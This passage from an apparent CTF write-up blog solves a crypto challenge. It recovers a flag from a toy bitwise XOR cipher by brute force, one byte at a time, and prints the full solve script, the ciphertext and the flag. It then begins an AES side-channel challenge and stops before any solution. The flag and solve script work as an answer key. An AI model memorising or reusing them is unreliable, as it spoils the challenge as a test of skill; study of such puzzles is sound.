style=&#34;color:#e6db74&#34;&gt;a9&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe0\xc5\xa0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;G&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb8\xf6\xbe\n\xb1\xd0\xdc&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd6\xfc\x15\x13\xbf&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xbf&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;S&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x94\x0e\x98\x9a\x12\xd0\x9e\xdf\xba&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd8\x8b\x0e&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;R&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x87&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb3\xd6\xcd\xef\x92\xa1\xa3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb4&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n\xdb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;w&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{DE&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The main encryption function is &lt;code&gt;my_crypto_inner(text, secret)&lt;/code&gt;, which takes in 2 arguments - the text and the secret. We are given the text, and our goal is to recover the secret which is the flag.&lt;/p&gt;
&lt;p&gt;Upon some testing, I noticed that the encryption of each byte seemed to be independent of other bytes - that is, there was no shuffling around within the encryption.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xce\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86\x8b\xbe\x00\x15&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;I&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;M&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1f\xe8\x87\x8e\xa3\xec&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8d\x8a\xbd\xd4\xe7\x92&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa1\x8c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;w&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x15&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;F&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x06\x8a\xa8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa6\xcd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xaf\xce\xbc\x90&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;go&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc4\r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xac\xb1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ng&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd5\x88\\\x07\xa9&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;z&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;G&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8d\xc2\x9f\x9c\x89\xf8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x87&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Ut&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xf5\xdc\xdd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;a9&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe0\xc5\xa0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;G&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb8\xf6\xbe\n\xb1\xd0\xdc&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd6\xfc\x15\x13\xbf&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xbf&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;S&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x94\x0e\x98\x9a\x12\xd0\x9e\xdf\xba&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd8\x8b\x0e&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;R&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x87&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb3\xd6\xcd\xef\x92\xa1\xa3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb4&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n\xdb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;w&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{DE&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;p4{&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# flag format&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; flag&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;?&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ind &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;encrypted &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; my_crypto(text,flag)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(encrypted[:&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(ciphertext[:&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Running the script above gave the output&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xce\x80\x06&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xfc\r\xae\xd6&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;W&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xce\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86\x8b\xbe\x00\x15&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;I&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Notice how the first 3 bytes &lt;code&gt;_\xce\x80&lt;/code&gt; are the same, as we entered the first 3 bytes correct (&lt;code&gt;p4{&lt;/code&gt; flag format)! This means we can recover the flag with a brute force approach, by appending a character to the end and checking if the encrypted matches the ciphertext at that index.&lt;/p&gt;
&lt;p&gt;For example, we can try encrypting &lt;code&gt;p4{a&lt;/code&gt;, &lt;code&gt;p4{b&lt;/code&gt; etc, and if the output at that index &lt;code&gt;3&lt;/code&gt; matched the given ciphertext at the same index, it would be the correct letter!&lt;/p&gt;
&lt;p&gt;We can automate this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ascii_letters &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digits &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;_!@#$%^&amp;amp;*(),./&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xce\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86\x8b\xbe\x00\x15&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;I&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;M&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1f\xe8\x87\x8e\xa3\xec&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8d\x8a\xbd\xd4\xe7\x92&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa1\x8c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;w&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x15&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;F&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x06\x8a\xa8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa6\xcd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xaf\xce\xbc\x90&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;go&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc4\r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xac\xb1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ng&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd5\x88\\\x07\xa9&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;z&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;G&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8d\xc2\x9f\x9c\x89\xf8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x87&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Ut&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xf5\xdc\xdd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;a9&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe0\xc5\xa0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;G&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb8\xf6\xbe\n\xb1\xd0\xdc&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd6\xfc\x15\x13\xbf&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xbf&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;S&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x94\x0e\x98\x9a\x12\xd0\x9e\xdf\xba&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd8\x8b\x0e&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;R&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x87&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb3\xd6\xcd\xef\x92\xa1\xa3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb4&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n\xdb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;w&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{DE&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;p4{&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# known flag format&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ind &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(flag) &lt;span style=&#34;color:#75715e&#34;&gt;# index we are brute forcing at&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; cs:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        temp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; flag&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;bytes([c])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        encrypted &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; my_crypto(text,temp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;?&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ciphertext[ind] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; encrypted[ind]:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            flag&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;bytes([c])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ind&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;found char &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;bytes([c])&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;, current flag: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;flag&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(flag&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode())
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Running this, we slowly but surely recover the full flag: &lt;code&gt;p4{It_4ls0_pu1ls_0ut_rodeNts_with_ITs_pawsFromShallowBurrows.}&lt;/code&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/pallas-solve.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;Full solve script:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;solve.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from pwn import *

#from sec import secret
#print(len(secret))

text   = b&amp;#34;The Pallas&amp;#39;s cat is a highly specialised predator of small mammals, which it catches by stalking or ambushing near exits of burrows.&amp;#34;

def bits_to_bytes(l):
	l = [str(f) for f in l]
	l=&amp;#34;&amp;#34;.join(l)
	final = [l[i * 8:(i &amp;#43; 1) * 8] for i in range((len(l) &amp;#43; 8 - 1) // 8 )]
	final = [int(x,2) for x in final]
	return bytes(final)

def bytes_to_bits(bb):
	r = &amp;#34;&amp;#34;
	for c in bb:
		r &amp;#43;= bin(c)[2:].rjust(8,&amp;#34;0&amp;#34;)
	r= list(map(int, r))
	return r

def my_crypto_inner(text, secret):
	tl = len(text)
	sl = len(secret)
	enc = [0]*len(text)
	for i in range(tl):
		enc[i]=text[i]
		enc[i]^=secret[i % sl]
		for div in range(1, tl):
			if i%div == 0:
				enc[i] ^= enc[(i-div) % sl]
			if i&amp;gt;0 and div%i == 0:
				enc[i] ^= text[(i-div) % sl]
	return enc

def my_crypto(text, secret):
	text = bytes_to_bits(text)
	secret = bytes_to_bits(secret)
	res = my_crypto_inner(text,secret)
	return bits_to_bytes(res)

import string

cs = string.ascii_letters &amp;#43; string.digits &amp;#43; &amp;#34;{}_!@#$%^&amp;amp;*(),./&amp;#34;
cs = cs.encode()

ciphertext = b&amp;#39;_\xce\x80^\x86\x8b\xbe\x00\x15I\xa7]\x86M\x1f\xe8\x87\x8e\xa3\xec_\x8d\x8a\xbd\xd4\xe7\x923\xa1\x8cw\x15F\x06\x8a\xa87\xa6\xcd)/\xaf\xce\xbc\x90go\xc4\r(\xac\xb1ng\xd5\x88\\\x07\xa9z\\G\x8d\xc2\x9f\x9c\x89\xf8r\x87Ut\xf5\xdc\xdda9\xe0\xc5\xa0G\xb8\xf6\xbe\n\xb1\xd0\xdc-\xd6\xfc\x15\x13\xbf}\xbf5\xb0S\x94\x0e\x98\x9a\x12\xd0\x9e\xdf\xba3\xd8\x8b\x0eR\x87$\xb3\xd6\xcd\xef\x92\xa1\xa3|\xb4-\n\xdbw\x86{DE&amp;#39;

flag = b&amp;#34;p4{&amp;#34; # known flag format
ind = len(flag) # index we are brute forcing at
while True:
    for c in cs:
        temp = flag&amp;#43;bytes([c])
        encrypted = my_crypto(text,temp.ljust(62,b&amp;#34;?&amp;#34;))
        if ciphertext[ind] == encrypted[ind]:
            flag&amp;#43;=bytes([c])
            ind&amp;#43;=1
            print(f&amp;#34;found char {bytes([c]).decode()}, current flag: {flag.decode()}&amp;#34;)
            break
    else:
	    break

print(flag.decode())

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;h1 id=&#34;aes_observed-crypto---6-solves&#34;&gt;aes_observed (crypto) - 6 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;We have managed to get a person near our enemies encryption box.&lt;br&gt;
He actions are limited but he can run some encryptions for us and percsely measure voltage just after sbox.&lt;br&gt;
Can we do something with this information that would help us to recover some other plaintexts?&lt;br&gt;
HINT: the Key is a flag.&lt;br&gt;
&lt;code&gt;nc aes-observed.zajebistyc.tf 9999&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are only given a server to connect to, which responds with 50 plaintext to voltage pairs.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Plaintext                                                        Voltage
78a41912ae910166f57e6f1a46df63ee3a434860e116f5343d111181e657cc5c 2.512
5f55d8fdb3ab5881554eadda588587c053f32b3abf282557b8dff50d03d5656a 2.418
etc...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The challenge name &lt;code&gt;aes_observed&lt;/code&gt; hints to these plaintexts being encrypted with AES, and the given voltage suggests we need to perform an AES &lt;a href=&#34;https://en.wikipedia.org/wiki/Side-channel_attack&#34;&gt;side-channel attack&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;There are 2 main side channel attacks given voltages for RSA - Differential Power Analysis (DPA) and Correlation Power Analysis (CPA). To be honest, I have absolutely no idea how to perform these attacks.&lt;/p&gt;
